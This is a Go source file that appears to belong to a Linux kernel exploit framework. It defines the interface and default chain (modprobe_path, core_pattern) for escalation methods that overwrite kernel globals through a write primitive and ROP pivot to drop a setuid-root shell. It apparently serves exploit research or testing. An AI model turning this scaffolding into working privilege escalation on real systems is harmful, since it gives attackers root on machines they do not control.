package kernelprivesc

import "fmt"

// Method is one privilege-escalation technique (modprobe_path, core_pattern,
// ...). Each overwrites a kernel global via the write primitive and triggers
// the kernel to drop a root shell from userspace.
//
// Methods run in two phases so they can be split around a kernel pivot:
// Prepare records the WriteKmem/MemsetKmem ROP segments (and writes the
// root-shell-dropping script to disk); TriggerAndWait fires the userspace
// trigger and waits for the setuid-root shell to appear. The CVE orchestrates
// the split — it calls Prepare, fires its pivot (which is what actually makes
// the WriteKmem-arranged writes land), then calls TriggerAndWait on a sibling
// thread. There is deliberately no single "Escalate" entry point that runs
// Prepare and TriggerAndWait back-to-back: with this package's deferred-write
// primitive model the kernel global is NOT overwritten until the pivot fires,
// so a back-to-back call would trigger the userspace action against the real
// (unmodified) global and silently fail to get root.
type Method interface {
	// Name is a short identifier used in logs and error messages
	// (e.g. "modprobe_path", "core_pattern").
	Name() string

	// Available reports whether this method can run on the current kernel
	// with the given primitive (e.g. the required symbol resolves). A false
	// return with nil error means "skip silently"; an error means "tried but
	// misconfigured" and is surfaced.
	Available(p KernelWritePrimitive) (bool, error)

	// Prepare writes the root-shell-dropping script to disk and issues the
	// WriteKmem/MemsetKmem calls that overwrite the kernel global(s). It does
	// NOT trigger the pivot or the userspace action — the arranged writes only
	// land when the CVE's pivot later runs the ROP. Returns the ShellArtifact
	// (so the caller can locate the setuid shell) on success.
	Prepare(p KernelWritePrimitive) (ShellArtifact, error)

	// TriggerAndWait fires the userspace trigger (e.g. exec an unknown-format
	// binary, or crash a child to coredump) and polls for the setuid-root
	// shell. Returns nil once the shell is ready. Called AFTER the pivot has
	// fired (the kernel globals are already overwritten).
	TriggerAndWait(p KernelWritePrimitive, a ShellArtifact) error
}

// DefaultMethods returns the default method chain: modprobe_path then
// core_pattern. (poweroff_cmd is excluded — too dangerous for a test box.)
func DefaultMethods() []Method {
	return []Method{
		ModprobePathMethod{},
		CorePatternMethod{},
	}
}

// SelectMethod returns the named method from DefaultMethods, or an error.
func SelectMethod(name string) (Method, error) {
	for _, m := range DefaultMethods() {
		if m.Name() == name {
			return m, nil
		}
	}
	return nil, fmt.Errorf("unknown kernel-privesc method %q (known: modprobe_path, core_pattern)", name)
}
